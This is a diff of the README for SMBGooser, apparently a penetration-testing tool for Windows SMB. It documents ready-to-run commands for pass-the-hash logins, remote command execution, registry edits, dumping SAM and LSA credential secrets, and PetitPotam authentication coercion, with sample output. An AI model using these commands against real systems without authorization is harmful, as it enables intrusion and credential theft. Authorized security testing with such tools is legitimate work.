@@ -39,6 +39,7 @@ go install github.com/ineffectivecoder/SMBGooser/cmd/smbgooser@latest
 ```
 
 Or build from source:
+
 ```bash
 git clone https://github.com/ineffectivecoder/SMBGooser.git
 cd SMBGooser
@@ -48,7 +49,7 @@ go build -o smbgooser ./cmd/smbgooser
 ## Quick Start
 
 ```bash
-# Connect with password
+# Connect with password (interactive mode)
 ./smbgooser -u username -t 192.168.1.10 -d DOMAIN -p 'password'
 
 # Pass-the-hash
@@ -60,11 +61,16 @@ export KRB5CCNAME=/path/to/ticket.ccache
 
 # With SOCKS5 proxy (pivoting)
 ./smbgooser -t 192.168.1.10 -u admin -p pass -s 127.0.0.1:1080
+
+# Non-interactive: execute commands and exit
+./smbgooser -t 192.168.1.10 -u admin -d DOMAIN -p pass -x 'sessions'
+./smbgooser -t 192.168.1.10 -u admin -d DOMAIN -p pass -x 'shares; use C$; ls'
 ```
 
 ## Interactive Commands
 
 ### Core
+
 | Command | Description |
 |---------|-------------|
 | `help` | Show available commands |
@@ -73,6 +79,7 @@ export KRB5CCNAME=/path/to/ticket.ccache
 | `exit` | Exit the shell |
 
 ### Share Operations
+
 | Command | Description |
 |---------|-------------|
 | `shares` | List available shares |
@@ -81,6 +88,7 @@ export KRB5CCNAME=/path/to/ticket.ccache
 | `shareaccess` | Check read/write access on shares |
 
 ### File Operations
+
 | Command | Description |
 |---------|-------------|
 | `ls [path]` | List directory contents |
@@ -94,6 +102,7 @@ export KRB5CCNAME=/path/to/ticket.ccache
 | `find <pattern>` | Search for files |
 
 ### Pipe & RPC Operations
+
 | Command | Description |
 |---------|-------------|
 | `pipes` | Enumerate named pipes |
@@ -105,12 +114,14 @@ export KRB5CCNAME=/path/to/ticket.ccache
 | `pipe transact <hex>` | Send/receive on pipe |
 
 ### Remote Execution
+
 | Command | Description |
 |---------|-------------|
 | `exec <command>` | Execute command via SCM (svcctl) |
 | `atexec <command>` | Execute command via Task Scheduler |
 
 ### Remote Registry
+
 | Command | Description |
 |---------|-------------|
 | `reg query <key> [value]` | Query registry key/value |
@@ -118,6 +129,7 @@ export KRB5CCNAME=/path/to/ticket.ccache
 | `reg delete <key> [value]` | Delete registry key/value |
 
 ### Service Control
+
 | Command | Description |
 |---------|-------------|
 | `svc list` | List all services |
@@ -126,15 +138,17 @@ export KRB5CCNAME=/path/to/ticket.ccache
 | `svc stop <name>` | Stop a service |
 
 ### Secrets & Recon
+
 | Command | Description |
 |---------|-------------|
-| `secretsdump` | Dump SAM hashes |
-| `secretsdump --lsa` | Also dump LSA secrets |
-| `secretsdump --all` | Dump SAM + LSA + cached creds |
+| `secretsdump` | Dump SAM + LSA secrets (default) |
+| `secretsdump --sam-only` | Dump SAM hashes only |
+| `secretsdump --lsa-only` | Dump LSA secrets only |
 | `users` | Enumerate domain users |
 | `users -g` | Enumerate domain groups |
 
 ### Coercion Attacks
+
 | Command | Description |
 |---------|-------------|
 | `coerce petitpotam <listener>` | PetitPotam attack (MS-EFSR) |
@@ -145,6 +159,7 @@ export KRB5CCNAME=/path/to/ticket.ccache
 ## Examples
 
 ### Remote Execution
+
 ```
 [SMBGooser] 192.168.1.10> exec "whoami > C:\temp\out.txt"
 [*] Creating SCMR client...
@@ -159,6 +174,7 @@ export KRB5CCNAME=/path/to/ticket.ccache
 ```
 
 ### Registry Operations
+
 ```
 [SMBGooser] 192.168.1.10> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion ProductName
 [*] Connecting to remote registry...
@@ -167,6 +183,7 @@ export KRB5CCNAME=/path/to/ticket.ccache
 ```
 
 ### Service Enumeration
+
 ```
 [SMBGooser] 192.168.1.10> svc query Spooler
 
@@ -176,6 +193,7 @@ export KRB5CCNAME=/path/to/ticket.ccache
 ```
 
 ### User Enumeration
+
 ```
 [SMBGooser] 192.168.1.10> users -d CORP
 
@@ -188,6 +206,7 @@ export KRB5CCNAME=/path/to/ticket.ccache
 ```
 
 ### Coercion Attacks
+
 ```
 [SMBGooser] 192.168.1.10> coerce petitpotam 192.168.1.100
 [*] Triggering PetitPotam via EfsRpcOpenFileRaw...
@@ -236,4 +255,3 @@ This tool is intended for authorized security testing and research purposes only
 ## License
 
 MIT License - See [LICENSE](LICENSE) for details.
-
